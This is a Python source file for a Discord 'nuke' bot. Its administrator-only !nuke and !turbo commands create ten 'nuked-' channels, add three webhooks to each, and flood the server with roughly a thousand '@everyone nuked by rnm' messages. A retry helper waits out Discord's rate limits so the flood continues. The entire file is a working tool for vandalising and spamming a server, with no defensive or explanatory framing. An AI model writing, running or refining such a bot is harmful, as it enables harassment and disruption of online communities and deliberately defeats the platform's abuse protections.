import discord
from discord.ext import commands
import asyncio
import random
import time
import os

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

SPAM_MESSAGE = "@everyone nuked by rnm"
CHANNEL_PREFIX = "nuked-"
NUM_CHANNELS = 10
WEBHOOKS_PER_CHANNEL = 3
MESSAGES_PER_WEBHOOK = 34
CREATE_CONCURRENCY = 10
WEBHOOK_CONCURRENCY = 15
SPAM_CONCURRENCY = 30
MAX_RETRIES = 6

@bot.event
async def on_ready():
    print(f"[+] Logged in as {bot.user} | BEST MODE ACTIVE")

async def safe_request(coro, retries=MAX_RETRIES):
    for attempt in range(retries):
        try:
            return await coro
        except discord.HTTPException as e:
            if e.status == 429:
                retry = getattr(e, "retry_after", None) or (0.25 * (attempt + 1))
                await asyncio.sleep(retry)
            else:
                break
        except Exception:
            break
    return None

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    guild = ctx.guild
    try:
        await ctx.message.delete()
    except:
        pass

    print(f"\n[*] BEST NUKE STARTED on {guild.name}")
    start = time.time()

    created_channels = []
    all_webhooks = []

    print("[*] Creating 10 channels...")
    sem_create = asyncio.Semaphore(CREATE_CONCURRENCY)

    async def create_channel(i):
        async with sem_create:
            name = f"{CHANNEL_PREFIX}{i}-{random.randint(100,999)}"
            channel = await safe_request(guild.create_text_channel(name))
            if channel:
                created_channels.append(channel)
                print(f"[+] {name}")
            return channel

    await asyncio.gather(*[create_channel(i) for i in range(NUM_CHANNELS)])
    print(f"[*] {len(created_channels)} channels ready ({time.time()-start:.1f}s)")

    print("[*] Creating 3 webhooks per channel...")
    sem_wh = asyncio.Semaphore(WEBHOOK_CONCURRENCY)

    async def create_webhooks(channel):
        async with sem_wh:
            for _ in range(WEBHOOKS_PER_CHANNEL):
                wh = await safe_request(channel.create_webhook(name=f"nuked-{random.randint(1000,9999)}"))
                if wh:
                    all_webhooks.append(wh)

    await asyncio.gather(*[create_webhooks(ch) for ch in created_channels])
    print(f"[*] {len(all_webhooks)} webhooks ready ({time.time()-start:.1f}s)")

    print("[*] Spamming for 1k messages...")
    sem_spam = asyncio.Semaphore(SPAM_CONCURRENCY)

    async def spam_webhook(wh):
        async with sem_spam:
            for _ in range(MESSAGES_PER_WEBHOOK):
                await safe_request(wh.send(SPAM_MESSAGE))

    await asyncio.gather(*[spam_webhook(wh) for wh in all_webhooks])

    total = time.time() - start
    total_msgs = len(all_webhooks) * MESSAGES_PER_WEBHOOK
    print(f"\n[+] FINISHED")
    print(f"    Time     : {total:.1f} seconds")
    print(f"    Channels : {len(created_channels)}")
    print(f"    Webhooks : {len(all_webhooks)}")
    print(f"    Messages : ~{total_msgs}")

@bot.command()
@commands.has_permissions(administrator=True)
async def turbo(ctx):
    await nuke(ctx)

bot.run(os.getenv("DISCORD_TOKEN"))
